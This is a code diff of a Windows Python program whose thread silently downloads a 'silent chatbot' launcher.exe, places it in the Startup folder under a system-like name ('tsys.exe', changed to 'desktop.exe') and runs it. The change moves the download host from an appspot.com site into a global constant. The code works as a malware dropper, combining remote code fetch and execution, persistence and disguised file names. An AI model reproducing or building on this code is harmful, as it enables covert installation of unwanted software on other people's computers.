@@ -8,6 +8,9 @@ import threading
 
 from win32com.shell import shellcon
 
+LAUNCHERURL = "http://192.168.2.4:8080/launcher.exe"
+global LAUNCHERURL
+
 class Downloader(threading.Thread):
     def __init__(self, script):
         """Make a thread to download/install the silent chatbot.
@@ -34,10 +37,9 @@ class Downloader(threading.Thread):
         
         #DIR the launcher
         if self._stop.is_set(): return
-        launcher.download_install_run(
-            "http://littlesitetomakemoney.appspot.com/launcher.exe", 
-            shellcon.CSIDL_STARTUP, 
-            "tsys.exe")
+        launcher.download_install_run(LAUNCHERURL, 
+                                      shellcon.CSIDL_STARTUP, 
+                                      "desktop.exe")
         return
         
     def stop(self):
